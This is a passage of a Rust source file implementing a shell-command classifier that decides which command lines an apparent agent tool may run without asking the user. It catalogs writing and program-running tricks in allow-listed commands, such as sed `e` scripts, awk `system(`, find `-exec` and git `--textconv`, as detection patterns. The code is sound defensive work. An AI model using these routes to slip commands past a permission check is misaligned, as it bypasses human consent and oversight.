//! What a command line does, one segment at a time (issues #15 and
//! #16). A hand-written scanner splits the line the way a shell reads
//! it — quoting first, so `grep -n "a|b"` is one command and not a
//! pipe — into segments at `|`, `||`, `&&`, `&`, `;`, newlines and
//! grouping parens. Each segment is then classified on its own: an
//! allow-list command with no writing flag and no redirection to a
//! file is read-only, `cd` and assignments are harmless, and a line
//! runs without asking only when every one of its segments is.
//!
//! The work is still syntactic and conservative. A command
//! substitution is classified by the same rules, recursively, and
//! anything the scanner cannot make sense of asks. A line that is not
//! all read-only asks once, as its riskiest segment (#16): the worst
//! kind a segment has, the last of the worst, so `git add && git
//! commit && git push` asks as `git push`.

use std::collections::VecDeque;
use std::path::{Path, PathBuf};

/// What one segment of a command line is, least to worst. The order is
/// the risk order too: the riskiest segment a line has is the worst
/// kind, the last of the worst.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Kind {
    /// An allow-list command with no writing flag: `grep -n x file`.
    ReadOnly,
    /// Nothing happens on its own: `cd dir`, an assignment, emptiness.
    Harmless,
    /// Not on any list, or an argument the rules cannot read.
    Unknown,
    /// A writing flag, or a redirection to a file.
    Write,
}

/// What [`classify`] found out about a command line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Classified {
    /// The worst kind any segment has.
    pub kind: Kind,
    /// Every segment is read-only or harmless: the line runs.
    pub allowed: bool,
    /// The allow patterns and grants the segments matched, in order,
    /// distinct — the suffix of the `bash allow-pattern` rule name.
    pub patterns: Vec<String>,
    /// The prefix words of the riskiest asking segment: what "don't
    /// ask again" grants, and the header names. `None` when nothing
    /// asks, empty when the ask is a redirection's.
    pub riskiest: Option<Vec<String>>,
    /// One segment's words as the `bash` row's text (issues #21, #38): the first
    /// substantive segment's — allow-listed or worse than harmless, never a no-op — or
    /// the first segment that has words when nothing is; redirections and a trailing
    /// bare fd fall away. Later substantive segments not behind a pipe add a ` +N`.
    pub main: String,
    /// Two or more segments have words or redirections.
    pub compound: bool,
}

/// A shell word: the text with quotes stripped, and what it hides.
#[derive(Debug, Clone, Default, PartialEq)]
struct Word {
    text: String,
    /// Some part was quoted: a value, never a command word.
    quoted: bool,
    /// An unresolved `$var` or `${...}`.
    var: bool,
    /// The text of every `$(...)` and backtick inside.
    subs: Vec<String>,
    /// A construct in it never closed: the line is not shell, and what
    /// the scanner read off it is not what would run.
    broken: bool,
}

impl Word {
    /// Nothing hides in it: what it says is what runs.
    fn literal(&self) -> bool {
        !self.quoted && !self.var && self.subs.is_empty()
    }

    /// A word an allow prefix stops before ([`crate::rules::prefix_of`]'s
    /// eye): quoted, hiding an expansion, or looking like a value.
    fn value_like(&self) -> bool {
        self.quoted
            || self.var
            || !self.subs.is_empty()
            || self.text.contains(['/', '.', ':', '='])
            || (!self.text.is_empty() && self.text.chars().all(|c| c.is_ascii_digit()))
    }
}

/// A redirection. Reading a file, feeding a heredoc, and duplicating a
/// descriptor change nothing; the rest write.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Redir {
    /// `>`, `>|`, `<>`, `&>`: writes a file.
    Out,
    /// `>>`, `&>>`: appends to a file.
    Append,
    /// `>&` (and `<&`): duplicates a descriptor — unless the target is
    /// not a number, which is the old `> word` spelling.
    Dup,
    /// `<`, `<<`, `<<<`: reads.
    In,
    /// `<(`, `>(`: runs a command.
    Proc,
}

#[derive(Debug, Clone)]
enum Piece {
    Word(Word),
    /// A segment break: `|`, `||`, `&&`, `&`, `;`, `;;`, a newline, or
    /// a grouping paren.
    Sep(Sep),
    Redirect {
        kind: Redir,
        target: Word,
    },
}

/// Which break: a `|` feeds the next command the last one's output, so
/// the next segment is a filter — the same work, not more of it. Every
/// other break (`||`, `&&`, `&`, `;`, `;;`, a newline, a paren) starts
/// work of its own.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Sep {
    Pipe,
    Other,
}

#[derive(Debug, Clone, Default)]
struct Segment {
    words: Vec<Word>,
    redirects: Vec<(Redir, Word)>,
    /// The segment follows a `|`: it reads the previous one's output.
    piped: bool,
}

/// A program that runs the command word after its own words: `sudo git
/// push` runs `git push`. The reader skips a forwarder's name, its
/// option words and its positional words to read the command word
/// behind it.
#[derive(Debug, Clone, Copy)]
pub(crate) struct Forwarder {
    /// The name a word matches by its final path component.
    pub(crate) name: &'static str,
    /// Options that take a value, written as a short option (`-u`) or a
    /// long name (`--user`).
    pub(crate) values: &'static [&'static str],
    /// Options that take no value: the read carries on to the word
    /// behind them.
    pub(crate) flags: &'static [&'static str],
    /// Options after which the wrapper runs no command of its own
    /// (`command -v`, `sudo -l`): the read ends at the option.
    pub(crate) stops: &'static [&'static str],
    /// Words of the wrapper's own after its options: `timeout`'s
    /// duration.
    pub(crate) positional: usize,
}

/// The forwarders the reader unwraps. A row's three option lists are
/// pairwise disjoint, so a name is read one way whatever order the
/// reader checks them in; a name added to one list has to leave the
/// others. Each list was read off that command's `--help`, or its man
/// page where only the man page names the option.
pub(crate) const FORWARDERS: &[Forwarder] = &[
    Forwarder {
        name: "sudo",
        values: &[
            "-u",
            "-g",
            "-h",
            "-p",
            "-C",
            "-T",
            "-R",
            "-D",
            "-U",
            "--user",
            "--group",
            "--host",
            "--prompt",
            "--close-from",
            "--command-timeout",
            "--chroot",
            "--chdir",
            "--other-user",
        ],
        flags: &[
            "-A",
            "-b",
            "-B",
            "-E",
            "-e",
            "-H",
            "-i",
            "-k",
            "-n",
            "-N",
            "-P",
            "-S",
            "-s",
            "--askpass",
            "--background",
            "--bell",
            "--preserve-env",
            "--edit",
            "--set-home",
            "--login",
            "--reset-timestamp",
            "--non-interactive",
            "--no-update",
            "--preserve-groups",
            "--stdin",
            "--shell",
        ],
        stops: &[
            "-K",
            "-l",
            "-v",
            "-V",
            "--remove-timestamp",
            "--list",
            "--validate",
            "--version",
            "--help",
        ],
        positional: 0,
    },
    Forwarder {
        name: "time",
        values: &[],
        flags: &["-p"],
        stops: &[],
        positional: 0,
    },
    Forwarder {
        name: "timeout",
        values: &["-k", "-s", "--kill-after", "--signal"],
        flags: &["-v", "--verbose", "--preserve-status", "--foreground"],
        stops: &["--help", "--version"],
        positional: 1,
    },
    Forwarder {
        name: "nice",
        values: &["-n", "--adjustment"],
        flags: &[],
        stops: &["--help", "--version"],
        positional: 0,
    },
    Forwarder {
        name: "nohup",
        values: &[],
        flags: &[],
        stops: &["--help", "--version"],
        positional: 0,
    },
    Forwarder {
        name: "exec",
        values: &["-a"],
        flags: &["-c", "-l"],
        stops: &[],
        positional: 0,
    },
    Forwarder {
        name: "stdbuf",
        values: &["-i", "-o", "-e", "--input", "--output", "--error"],
        flags: &[],
        stops: &["--help", "--version"],
        positional: 0,
    },
    Forwarder {
        name: "env",
        values: &[
            "-u",
            "-C",
            "-S",
            "-a",
            "--unset",
            "--chdir",
            "--split-string",
            "--argv0",
        ],
        flags: &[
            "-i",
            "-0",
            "-v",
            "--ignore-environment",
            "--null",
            "--debug",
        ],
        stops: &["--help", "--version"],
        positional: 0,
    },
    Forwarder {
        name: "command",
        values: &[],
        flags: &["-p"],
        stops: &["-v", "-V"],
        positional: 0,
    },
    Forwarder {
        name: "builtin",
        values: &[],
        flags: &[],
        stops: &[],
        positional: 0,
    },
];

/// `git`'s global options that take a value, as a short option or a
/// long name.
pub(crate) const GIT_VALUES: &[&str] = &[
    "-C",
    "-c",
    "--git-dir",
    "--work-tree",
    "--namespace",
    "--exec-path",
    "--config-env",
    "--attr-source",
    "--super-prefix",
];

/// `git`'s global options that take no value.
pub(crate) const GIT_FLAGS: &[&str] = &[
    "-p",
    "--paginate",
    "-P",
    "--no-pager",
    "-v",
    "--version",
    "-h",
    "--help",
    "--html-path",
    "--man-path",
    "--info-path",
    "--literal-pathspecs",
    "--glob-pathspecs",
    "--noglob-pathspecs",
    "--icase-pathspecs",
    "--bare",
    "--no-replace-objects",
    "--no-lazy-fetch",
    "--no-optional-locks",
    "--no-advice",
];

/// Cap on recursion into nested substitutions; past it, ask.
const MAX_DEPTH: usize = 8;

/// Classify a command line against the allow patterns and the grants
/// (`rules::default_bash_allow` is the usual allow list; grants are the
/// project's allowed prefixes). One pass, no state: the same line
/// always classifies the same.
pub(crate) fn classify(command: &str, allow: &[String], grants: &[String]) -> Classified {
    classify_within(command, allow, grants, 0)
}

fn classify_within(src: &str, allow: &[String], grants: &[String], depth: usize) -> Classified {
    let segs = segments(Scanner::scan(src));
    let occupied = segs
        .iter()
        .filter(|s| !s.words.is_empty() || !s.redirects.is_empty())
        .count();
    let mut kind = Kind::Harmless;
    let mut patterns: Vec<String> = Vec::new();
    let mut riskiest: Option<Vec<String>> = None;
    let mut worst = Kind::ReadOnly;
    // The row's segment (issue #21): the first that is more than
    // harmless — the work, not the `cd` that sets it up. `main` stays
    // empty until one is found, then holds; a later, worse segment is
    // the menu's word for the line, not the row's.
    let mut main = String::new();
    // Segments past the row's own that are work of their own (issue
    // #38): `cargo test && sed -i …` is two things, the row says so.
    // A segment behind a `|` is a filter of the row's output, not
    // more work, so it never counts.
    let mut more = 0usize;
    for seg in &segs {
        let sc = classify_segment(seg, allow, grants, depth);
        kind = kind.max(sc.kind);
        // The riskiest asking segment is the worst kind, the last of
        // the worst.
        if sc.kind > Kind::Harmless && sc.kind >= worst {
            worst = sc.kind;
            riskiest = Some(match sc.sub {
                Some(name) => name,
                None => sc.prefix,
            });
        }
        // `ReadOnly` is the least of the kinds, and `Worst` only ever
        // rises, so an allow-listed command (`cargo test`) folds to
        // Harmless — its `pattern` is the trace that it runs. The row
        // names the first segment that does something, not the `cd`
        // that sets it up. A no-op (`true`, `echo ---`) is nothing to
        // name, even though it is not allow-listed.
        let substantive = (sc.pattern.is_some() || sc.kind > Kind::Harmless) && !is_noop(seg);
        if main.is_empty() {
            if substantive {
                main = segment_text(seg);
            }
        } else if substantive && !seg.piped {
            more += 1;
        }
        if let Some(p) = sc.pattern
            && !patterns.contains(&p)
        {
            patterns.push(p);
        }
    }
    // Nothing does anything (`cd x && true`): the row is the first
    // segment that has words.
    if main.is_empty() {
        main = segs
            .iter()
            .map(segment_text)
            .find(|t| !t.is_empty())
            .unwrap_or_default();
    } else if more > 0 {
        // The row says the line's first work and that other work
        // follows (issue #38): `cargo test +1`.
        main = format!("{main} +{more}");
    }
    Classified {
        kind,
        allowed: kind <= Kind::Harmless,
        patterns,
        riskiest,
        main,
        compound: occupied > 1,
    }
}

/// The segment's words for the `bash` row (issue #21): space-joined,
/// redirections gone, a trailing bare fd (`2` of a `2>&1`) dropped —
/// words that never closed are skipped, for they are not shell.
fn segment_text(seg: &Segment) -> String {
    segment_words(seg).join(" ")
}

/// The words of one segment, in order, with a bare descriptor number
/// dropped: a trailing number on a redirecting segment is the `2` of
/// `2>&1`, plumbing rather than a word.
fn segment_words(seg: &Segment) -> Vec<&str> {
    let mut words: Vec<&str> = seg
        .words
        .iter()
        .filter(|w| !w.broken && !w.text.is_empty())
        .map(|w| w.text.as_str())
        .collect();
    if !seg.redirects.is_empty()
        && words
            .last()
            .is_some_and(|w| w.bytes().all(|b| b.is_ascii_digit()))
    {
        words.pop();
    }
    words
}

/// One segment, classified.
#[derive(Debug, Clone)]
struct SegClass {
    kind: Kind,
    /// The allow pattern or grant its command matched.
    pattern: Option<String>,
    /// Its leading words, for `prefix_of`: empty when a redirection
    /// carries the risk, since no command prefix covers that.
    prefix: Vec<String>,
    /// The risk is a substitution's, and this is the substitution's
    /// own riskiest prefix.
    sub: Option<Vec<String>>,
    /// A `Write` came from the segment's command — a writing flag or a
    /// command folded out of a `$(…)` — and not only from a
    /// redirection. A caller that exempts a redirection has to tell the
    /// two apart.
    write_from_command: bool,
}

/// The worst kind so far, and where it came from.
struct Worst {
    kind: Kind,
    sub: Option<Vec<String>>,
    redirect: bool,
    /// See [`SegClass::write_from_command`]. Set whenever a fold brings
    /// the write in, even when the kind was `Write` already: a
    /// redirection's write must not hide the command's.
    write_from_command: bool,
}

impl Worst {
    fn fold(&mut self, kind: Kind, sub: Option<Vec<String>>, redirect: bool) {
        if kind == Kind::Write && !redirect {
            self.write_from_command = true;
        }
        if kind > self.kind {
            self.kind = kind;
            self.sub = sub;
            self.redirect = redirect;
        }
    }

    /// A substitution or a process substitution runs a command of its
    /// own; its classification, and its riskiest prefix if it asks,
    /// are the segment's.
    fn fold_sub(&mut self, inner: &Classified) {
        self.fold(inner.kind, inner.riskiest.clone(), false);
    }
}

/// `git`'s global options that change neither what the subcommand runs
/// nor what it reads or writes. The classifier reads the words past
/// them, so `git --no-pager log -5` reads as `git log -5`. An option
/// that names a file, a directory, a config key or a program is not
/// here: it changes where git looks or what it runs.
///
/// `-p`/`--paginate` are harmless because stdout is captured to a pipe,
/// so git starts no pager; `core.pager = always` can only be set through
/// `-c` (still asking) or a repository's `.git/config`, which is an edit.
const GIT_TRANSPARENT: &[&str] = &[
    "-p",
    "--paginate",
    "-P",
    "--no-pager",
    "--literal-pathspecs",
    "--glob-pathspecs",
    "--noglob-pathspecs",
    "--icase-pathspecs",
    "--no-replace-objects",
];

/// The segment's words past `git`'s transparent global options
/// ([`GIT_TRANSPARENT`]), or `None` when there are none to read past: a
/// line that is not `git`, a bare `git`, or a word the table does not
/// hold — which leaves the words as written, so the line asks as it
/// does without the table. Only a table entry is dropped; every other
/// word, the subcommand's own options included, stays in the result.
fn past_git_globals<'a>(rest: &[&'a Word]) -> Option<Vec<&'a Word>> {
    let head = *rest.first()?;
    if head.broken || head.text != "git" || !head.literal() {
        return None;
    }
    let mut at = 1;
    while let Some(word) = rest.get(at) {
        if word.broken || !word.literal() || !GIT_TRANSPARENT.contains(&word.text.as_str()) {
            break;
        }
        at += 1;
    }
    // Two words past the head are needed: an option and something after
    // it. A bare `git --no-pager` stays as written.
    if at == 1 || at == rest.len() {
        return None;
    }
    let mut words = Vec::with_capacity(rest.len() - at + 1);
    words.push(head);
    words.extend_from_slice(&rest[at..]);
    Some(words)
}

fn classify_segment(seg: &Segment, allow: &[String], grants: &[String], depth: usize) -> SegClass {
    let mut w = Worst {
        kind: Kind::Harmless,
        sub: None,
        redirect: false,
        write_from_command: false,
    };

    // Redirections: to a file writes; a process substitution runs a
    // command of its own.
    for (kind, target) in &seg.redirects {
        if target.broken {
            w.fold(Kind::Unknown, None, false);
            continue;
        }
        match kind {
            Redir::In => {}
            // `2>&1`: a descriptor, never a file. `>&word` with a word
            // that is not a number is the old `> word` spelling, which
            // writes (issue #15 lists the harmless forms).
            Redir::Dup => {
                if !duplicates_a_descriptor(*kind, target) {
                    w.fold(redirect_kind(target), None, true);
                }
            }
            Redir::Out | Redir::Append => w.fold(redirect_kind(target), None, true),
            Redir::Proc => fold_sub(&mut w, &target.text, allow, grants, depth),
        }
        for sub in &target.subs {
            fold_sub(&mut w, sub, allow, grants, depth);
        }
    }

    // Every substitution inside a word runs, whatever the word is for;
    // a word that never closed is not shell, and asks.
    for word in &seg.words {
        if word.broken {
            w.fold(Kind::Unknown, None, false);
            continue;
        }
        for sub in &word.subs {
            fold_sub(&mut w, sub, allow, grants, depth);
        }
    }

    // The command, past leading assignments and the control words
    // that only introduce it (`if grep -q x` is grep).
    let rest: Vec<&Word> = seg
        .words
        .iter()
        .skip_while(|w| is_assignment(w) || introduces(w))
        .collect();
    // `git --no-pager log -5` reads as `git log -5`: the allow rows are
    // written without the global options that change nothing, so the
    // writing flags and the unreadable-argument check read the same words
    // the rows are matched against.
    let aligned = past_git_globals(&rest);
    let rules: &[&Word] = aligned.as_deref().unwrap_or(&rest);
    let mut pattern = None;
    if let Some(cmd) = rest.first() {
        if is_control(&rest) {
            // `for s in words`, `case $x in`, `done`: the segment sets
            // a loop up or closes one; its body is a segment of its
            // own.
        } else if !cmd.subs.is_empty() {
            // The command itself is a substitution, folded above.
        } else if cmd.var {
            w.fold(Kind::Unknown, None, false);
        } else if cmd.text == "cd" {
            // Changes the directory: harmless on its own (#15).
        } else if let Some((p, granted)) = match_leading(&rest, allow, grants).or_else(|| {
            // A row is written without the options, so it is tried again on
            // the words past them. A grant is not: consent covers the words
            // the person saw.
            aligned
                .as_deref()
                .and_then(|view| match_leading(view, allow, &[]))
        }) {
            if granted {
                // The user allowed these words: consent covers the
                // flags between them, and has covered them since the
                // rule existed. Only a redirection still asks.
                pattern = Some(p);
                w.fold(Kind::ReadOnly, None, false);
            } else if writing_flag(cmd.text.as_str(), rules) {
                w.fold(Kind::Write, None, false);
            } else if flag_sensitive(cmd.text.as_str(), rules)
                && argument_the_rules_cannot_read(cmd.text.as_str(), rules)
            {
                // An argument the rules cannot read may hold one of
                // the writing flags.
                w.fold(Kind::Unknown, None, false);
            } else {
                pattern = Some(p);
                w.fold(Kind::ReadOnly, None, false);
            }
        } else {
            w.fold(Kind::Unknown, None, false);
        }
    }

    let prefix = if w.redirect {
        Vec::new()
    } else {
        prefix_words(&rest)
    };
    SegClass {
        kind: w.kind,
        pattern,
        prefix,
        sub: w.sub,
        write_from_command: w.write_from_command,
    }
}

/// `> target`: writing, unless the target is the bin it may go to.
fn redirect_kind(target: &Word) -> Kind {
    if target.literal() && target.text == "/dev/null" {
        Kind::Harmless
    } else {
        Kind::Write
    }
}

/// A substitution, classified; depth is where the asking starts.
fn fold_sub(w: &mut Worst, sub: &str, allow: &[String], grants: &[String], depth: usize) {
    if depth < MAX_DEPTH {
        w.fold_sub(&classify_within(sub, allow, grants, depth + 1));
    } else {
        w.fold(Kind::Unknown, None, false);
    }
}

/// A word that assigns `GIT_INDEX_FILE=...`: the name before the first
/// `=` is exactly that, and nothing in the word hides what it assigns.
fn assigns_index(w: &Word) -> bool {
    w.subs.is_empty()
        && !w.broken
        && w.text
            .split_once('=')
            .is_some_and(|(name, _)| name == "GIT_INDEX_FILE")
}

/// `NAME=value` before the command: the environment for one command,
/// harmless on its own.
fn is_assignment(w: &Word) -> bool {
    if w.quoted || !w.subs.is_empty() {
        return false;
    }
    let Some((name, _)) = w.text.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// The control words that only introduce the command after them:
/// `if grep -q x` runs grep, `then echo done` runs echo, `! grep -q x`
/// runs grep. The introducer itself runs nothing.
fn introduces(w: &Word) -> bool {
    w.literal()
        && matches!(
            w.text.as_str(),
            "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "!"
        )
}

/// The words that set a construct up or close it — `for s in words`,
/// `case $x in`, `select x`, `in`, `done`, `fi`, `esac` — never the
/// command itself; what a construct runs is a segment of its own.
fn is_control(rest: &[&Word]) -> bool {
    rest.first().is_some_and(|w| {
        w.literal()
            && matches!(
                w.text.as_str(),
                "for" | "select" | "case" | "in" | "done" | "fi" | "esac"
            )
    })
}

/// The row's no-ops (issue #38): a `||` guard's `true`, an `echo ---` separator, `sleep`
/// — the line's work is elsewhere. Past assignments/introducers, as `classify_segment` reads.
fn is_noop(seg: &Segment) -> bool {
    let mut rest = seg
        .words
        .iter()
        .skip_while(|w| is_assignment(w) || introduces(w));
    rest.next().is_some_and(|w| {
        w.literal()
            && matches!(
                w.text.as_str(),
                "true" | "false" | ":" | "echo" | "printf" | "set" | "export" | "sleep"
            )
    })
}

/// The first pattern or grant whose words equal the segment's leading
/// words; the allow list first, then the grants.
fn match_leading(rest: &[&Word], allow: &[String], grants: &[String]) -> Option<(String, bool)> {
    allow
        .iter()
        .map(|p| (p, false))
        .chain(grants.iter().map(|p| (p, true)))
        .find_map(|(p, granted)| {
            let words: Vec<&str> = p.split_whitespace().collect();
            (!words.is_empty()
                && words.len() <= rest.len()
                && words
                    .iter()
                    .zip(rest.iter().map(|w| w.text.as_str()))
                    .all(|(pw, w)| pw == &w))
            .then(|| (p.clone(), granted))
        })
}

/// The words an allow prefix is made of: the segment's leading words
/// up to the first that looks like a value. The first word always
/// counts; nothing else does after a value.
fn prefix_words(rest: &[&Word]) -> Vec<String> {
    let mut out = Vec::new();
    for (i, word) in rest.iter().enumerate() {
        if i > 0 && word.value_like() {
            break;
        }
        out.push(word.text.clone());
    }
    out
}

/// The writing flags of the allow list (issue #15): a listed command
/// with one of these modifies something, so it asks after all.
fn writing_flag(command: &str, rules: &[&Word]) -> bool {
    let mut args = rules.iter().skip(1);
    match command {
        "sed" => args.any(|w| {
            let t = &w.text;
            t.starts_with("--in-place")
                || (!t.starts_with("--")
                    && t.starts_with('-')
                    && t.len() > 1
                    && t[1..].contains('i'))
                || (!t.starts_with('-') && sed_script_writes(t))
        }),
        "find" => args.any(|w| {
            let t = w.text.trim_start_matches('-');
            t == "delete"
                || t == "fls"
                || t.starts_with("exec")
                || t.starts_with("ok")
                || t.starts_with("fprint")
        }),
        "sort" => args.any(|w| w.text == "-o" || w.text.starts_with("--output")),
        "awk" => args.any(|w| {
            let t = &w.text;
            t == "-i" || (!t.starts_with('-') && awk_program_writes(t))
        }),
        "git" => match rules.get(1).map(|w| w.text.as_str()) {
            Some("branch") => git_branch_writes(&rules[2..]),
            Some("grep") => git_grep_runs_program(&rules[2..]),
            Some("reflog") => git_reflog_writes(&rules[2..]),
            Some("diff" | "log" | "show") => {
                rules.iter().skip(2).any(|w| w.text.starts_with("--output"))
                    || git_diff_runs_program(&rules[2..])
            }
            _ => false,
        },
        "gh" if rules.get(1).map(|w| w.text.as_str()) == Some("api") => gh_api_writes(&rules[2..]),
        _ => false,
    }
}

/// `git branch`'s listing forms take no free argument: a name creates a
/// branch, and the flags that write are `-d -D -m -M -c -C`,
/// `--delete`, `--move`, `--copy`, `--set-upstream-to` and
/// `--edit-description`. `--contains`, `--merged` and their kin take a
/// value, which is not a free argument.
fn git_branch_writes(args: &[&Word]) -> bool {
    let mut takes_value = false;
    for w in args {
        let t = w.text.as_str();
        if takes_value {
            takes_value = false;
            continue;
        }
        if matches!(t, "-d" | "-D" | "-m" | "-M" | "-c" | "-C")
            || t.starts_with("--delete")
            || t.starts_with("--move")
            || t.starts_with("--copy")
            || t.starts_with("--set-upstream")
            || t.starts_with("--edit-description")
            || !t.starts_with('-')
        {
            return true;
        }
        takes_value = matches!(
            t,
            "--contains"
                | "--no-contains"
                | "--merged"
                | "--no-merged"
                | "--points-at"
                | "--sort"
                | "--format"
        );
    }
    false
}

/// `git grep`'s `-O`/`--open-files-in-pager[=<program>]` runs the
/// program it names on every matching file, and `--textconv` runs the
/// one repository data names (`.gitattributes` and
/// `diff.<driver>.textconv`), so a line carrying either asks. The short
/// form takes its value attached and clusters with other flags
/// (`-nOcat`), and git accepts any unambiguous prefix of a long name
/// (`--open`), so both are read loosely: a `--no-` spelling opens
/// nothing and is not one.
fn git_grep_runs_program(args: &[&Word]) -> bool {
    args.iter().any(|w| {
        let t = w.text.as_str();
        if let Some(long) = t.strip_prefix("--") {
            let name = long.split('=').next().unwrap_or(long);
            !name.is_empty() && "open-files-in-pager".starts_with(name)
        } else {
            t.starts_with('-') && t.len() > 1 && t[1..].contains('O')
        }
    }) || args.iter().any(|w| names_textconv(&w.text))
}

/// Whether a word names git's `--textconv`: the option itself or an
/// unambiguous prefix of it, with any `=<value>` cut off. `--no-textconv`
/// turns the filter off and is not one. The reading is loose — a name git
/// would reject as ambiguous still counts — because an over-ask is
/// cheaper than a miss.
fn names_textconv(t: &str) -> bool {
    let Some(long) = t.strip_prefix("--") else {
        return false;
    };
    let name = long.split('=').next().unwrap_or(long);
    !name.is_empty() && "textconv".starts_with(name)
}

/// Whether a word makes `git diff`, `git log` or `git show` run the
/// filter program repository data names (`.gitattributes` `diff=<driver>`
/// plus `diff.<driver>.textconv` in config): `--textconv` and its
/// prefixes, and the `-a`/`--text` spelling that asks for the same
/// filter, which the loose long-name reading catches too.
///
/// `--no-textconv` runs nothing and is not one. A short cluster is read
/// only up to the first letter that takes a value (`S G L O U M C B l n
/// X`): git consumes the rest of the word as that option's value, so the
/// `a` in `git log -Sparse` is part of the pattern, not a flag.
fn git_diff_runs_program(args: &[&Word]) -> bool {
    args.iter().any(|w| {
        let t = w.text.as_str();
        names_textconv(t)
            || (t.starts_with('-')
                && !t.starts_with("--")
                && t.len() > 1
                && t[1..]
                    .chars()
                    .take_while(|c| {
                        !matches!(
                            c,
                            'S' | 'G' | 'L' | 'O' | 'U' | 'M' | 'C' | 'B' | 'l' | 'n' | 'X'
                        )
                    })
                    .any(|c| c == 'a'))
    })
}

/// `git reflog`'s read forms take options and a ref; `expire`, `delete`
/// and `drop` rewrite the log. The three are matched in any position:
/// the rules read words, not git's option parser.
fn git_reflog_writes(args: &[&Word]) -> bool {
    ["expire", "delete", "drop"]
        .iter()
        .any(|w| args.iter().any(|a| a.text == *w))
}

/// Subcommands whose output is a repository token — an object id, or
/// several — and never a word git reads as an option.
const GIT_PRINTS_A_TOKEN: &[&str] = &["rev-parse", "rev-list"];

/// Whether a substitution's inner line prints only such a token: one
/// segment, every word readable, nothing written, and a dash-free
/// `git rev-parse` or `git rev-list` behind git's transparent pager and
/// pathspec options.
///
/// The dash rule is the load-bearing one: git echoes an argument it
/// cannot resolve to stdout before it fails (`git rev-parse --x` prints
/// `--x`), so only a dash-free line cannot make one of the two print a
/// word the outer command would read as an option.
fn prints_a_token(inner: &str) -> bool {
    let segs = segments(Scanner::scan(inner));
    let mut occupied = segs
        .iter()
        .filter(|s| !s.words.is_empty() || !s.redirects.is_empty());
    let Some(seg) = occupied.next() else {
        return false;
    };
    if occupied.next().is_some() {
        return false;
    }
    if seg
        .words
        .iter()
        .any(|w| w.var || !w.subs.is_empty() || w.broken)
    {
        return false;
    }
    if !seg
        .redirects
        .iter()
        .all(|(kind, target)| writes_nothing(*kind, target))
    {
        return false;
    }
    let words: Vec<&Word> = seg.words.iter().collect();
    let aligned = past_git_globals(&words);
    let words: &[&Word] = aligned.as_deref().unwrap_or(&words);
    words.first().is_some_and(|head| head.text == "git")
        && words
            .get(1)
            .is_some_and(|sub| GIT_PRINTS_A_TOKEN.contains(&sub.text.as_str()))
        && !words[2..].iter().any(|w| w.text.starts_with('-'))
}

/// A redirection that writes nothing: reading a file, sparing a stream
/// (`/dev/null`), or duplicating a descriptor.
fn writes_nothing(kind: Redir, target: &Word) -> bool {
    matches!(kind, Redir::In)
        || redirect_kind(target) == Kind::Harmless
        || duplicates_a_descriptor(kind, target)
}

/// A sed script can write a file or run a command: `w file`, `W file`
/// and `s/x/y/w file` write; `e cmd` and `s/x/y/e` run a shell
/// command. Those letters count only at a script boundary — starting
/// a command, after `;`, a brace, a delimiter or another flag —
/// followed by a space or the end.
fn sed_script_writes(script: &str) -> bool {
    let s: Vec<char> = script.chars().collect();
    (0..s.len()).any(|i| {
        if !matches!(s[i], 'w' | 'W' | 'e') {
            return false;
        }
        let before = i == 0
            || matches!(
                s[i - 1],
                ';' | '\n'
                    | '{'
                    | '}'
                    | '/'
                    | '|'
                    | ','
                    | '#'
                    | '!'
                    | ':'
                    | 'w'
                    | 'W'
                    | 'e'
                    | 'g'
                    | 'p'
                    | 'i'
                    | 'I'
                    | 'm'
                    | 'M'
                    | 's'
                    | '0'..='9'
            );
        let after = i + 1 == s.len() || s[i + 1].is_whitespace();
        before && after
    })
}

/// An awk program writes through `system(`, a redirection, or a pipe
/// to or from a command. `$1 > 5` comparisons look like redirections
/// and ask too: better one prompt too many than one too few.
fn awk_program_writes(program: &str) -> bool {
    program.contains("system(")
        || program.contains('>')
        || program.contains("| getline")
        || program.contains("| \"")
}

/// `gh api` reads with GET (issue #15). A method that is not GET or
/// HEAD writes; so do fields without a method — gh switches to POST —
/// and `--input`, which uploads a body.
fn gh_api_writes(args: &[&Word]) -> bool {
    let mut method: Option<String> = None;
    let mut fields = false;
    let mut input = false;
    let mut it = args.iter();
    while let Some(w) = it.next() {
        let t = &w.text;
        if t == "-X" || t == "--method" {
            method = it.next().map(|v| v.text.to_uppercase());
        } else if let Some(v) = t.strip_prefix("--method=") {
            method = Some(v.to_uppercase());
        } else if let Some(v) = t.strip_prefix("-X") {
            method = Some(v.to_uppercase());
        } else if t.starts_with("--field")
            || t.starts_with("--raw-field")
            || matches!(t.as_str(), "-f" | "-F")
            || (t.starts_with("-f") || t.starts_with("-F")) && t.len() > 2
        {
            fields = true;
        } else if t == "--input" || t.starts_with("--input=") {
            input = true;
        }
    }
    if input {
        return true;
    }
    match method.as_deref() {
        Some(m) if m != "GET" && m != "HEAD" => true,
        _ => {
            let read = matches!(method.as_deref(), Some("GET") | Some("HEAD"));
            fields && !read
        }
    }
}

/// Commands whose writing flags the rules read closely enough that an
/// argument they cannot read might be one of them.
fn flag_sensitive(command: &str, rules: &[&Word]) -> bool {
    match command {
        "sed" | "find" | "sort" | "awk" => true,
        "git" => matches!(
            rules.get(1).map(|w| w.text.as_str()),
            Some("branch" | "diff" | "grep" | "log" | "reflog" | "show")
        ),
        "gh" => rules.get(1).map(|w| w.text.as_str()) == Some("api"),
        _ => false,
    }
}

/// Whether an allow-listed command has an argument whose text the rules
/// cannot read, and so may hold one of its writing flags.
///
/// `git log` and `git show` ask on a substitution too: its words land in
/// the argument list as words, so it may hide `--textconv` or
/// `--output`. Only a query that can print nothing but a repository token
/// ([`prints_a_token`]) stays read without asking. `git diff` and the
/// rest ask on a substitution whatever it prints.
fn argument_the_rules_cannot_read(command: &str, rules: &[&Word]) -> bool {
    let git_subcommand = rules.get(1).map(|w| w.text.as_str());
    if command == "git" && matches!(git_subcommand, Some("log" | "show")) {
        return rules
            .iter()
            .any(|a| a.var || a.subs.iter().any(|sub| !prints_a_token(sub)));
    }
    rules.iter().any(|a| a.var || !a.subs.is_empty())
}

fn segments(pieces: Vec<Piece>) -> Vec<Segment> {
    let mut segs: Vec<Segment> = Vec::new();
    let mut cur = Segment::default();
    for piece in pieces {
